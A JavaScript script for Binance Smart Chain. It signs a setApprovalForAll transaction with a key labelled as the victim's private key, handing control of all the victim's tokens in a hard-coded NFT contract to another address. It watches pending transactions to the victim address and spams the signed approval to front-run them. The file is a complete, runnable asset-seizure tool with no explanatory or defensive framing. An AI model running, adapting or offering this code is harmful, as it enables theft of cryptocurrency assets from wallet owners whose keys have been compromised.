require("dotenv").config();
const ethers = require("ethers");
const Web3 = require('web3');
const web3 = new Web3('https://bsc-dataseed1.binance.org/');
const provider = new ethers.providers.WebSocketProvider(process.env.WSSPROVIDER);
	
const Transaction = require('ethereumjs-tx');
const Common = require('ethereumjs-common').default;
const Tx = require('ethereumjs-tx').Transaction;

const VICTIM_PRIVATE_KEY = process.env.VICTIM_PRIVATE_KEY
const BSCSCAN_TOKEN = process.env.BSCSCAN_TOKEN
const VICTIM_ADDRESS = process.env.VICTIM_ADDRESS
const NEW_ADDRESS = process.env.NEW_ADDRESS
//const CHAR_ADDRESS = process.env.CHAR_ADDRESS
const CHAR_ADDRESS='0xd757A6342e4bFB165a5848bC930773E400afEa25'
const CHAR = require('./Char.json');

//--------------------- PRIVATE KEY | DON'T SHARE IT WITH ANYBODY ---------------------
const privKey = Buffer.from(VICTIM_PRIVATE_KEY, 'hex');
//--------------------- --------------------- --------------------- ---------------------

let NONCE = 0;
let FINAL_TX;
let OLD_NONCE = -1;

async function createSignedTx() {
	const id = await web3.eth.net.getId();
	const contract = new web3.eth.Contract(CHAR, CHAR_ADDRESS);
	let functionAbi = contract.methods.setApprovalForAll(NEW_ADDRESS, true).encodeABI();
	const customConfig = (id) => Common.forCustomChain(
		'mainnet',
		{
			networkId: id,
			chainId: id,
		},
		'petersburg'
	);
	const common = customConfig(56);
	const useGas = web3.utils.toHex(web3.utils.toWei('5.2', 'gwei'));
	const rawTx = {
		nonce: web3.utils.toHex(NONCE),
		to: CHAR_ADDRESS,
		value: 0,
		gasLimit: web3.utils.toHex(1000000),
		gasPrice: useGas,
		chainId: 56,
		data: functionAbi
	};
	var tx = new Tx(rawTx, { common: common });
	tx.sign(privKey);

	var serializedTx = tx.serialize();
	FINAL_TX = '0x' + serializedTx.toString('hex')
}

async function getNonce() {
	NONCE = await web3.eth.getTransactionCount(VICTIM_ADDRESS).then(data => {
		return data;
	}).catch(e => { });
	if (typeof NONCE !== 'number') {
		console.log('nonce error!')
		return;
	}
	if(OLD_NONCE != NONCE){
		OLD_NONCE = NONCE;
		console.log("------- NEW NONCE -------" + NONCE);
	}
}

async function sendTransaction() {
	let counter = 0;
	let limit = 10000;
	while(true) {
		const createReceipt = await web3.eth.sendSignedTransaction(FINAL_TX)
			.then(data => {
				console.log("SUCCESS");
				console.log(data);
				process.exit(); //EXIT
			}).catch(e => {
				console.log("error");
				console.log(e);
			});
		counter ++;
		if (counter > limit)
			process.exit(); //EXIT
	}
}

async function pendingTrasactions() {
	nonce_interval = setInterval(getNonce, 1000);
	createSignedTx();
	provider.on("pending", async (txHash, error) => {
		const txInfo = await provider.getTransaction(txHash);
		if(txInfo && txInfo.to && txInfo.to.includes(VICTIM_ADDRESS + ""))
			sendTransaction();
			
	});
	process.on('uncaughtException', function (err) {
		console.log(err);
	});
}

pendingTrasactions();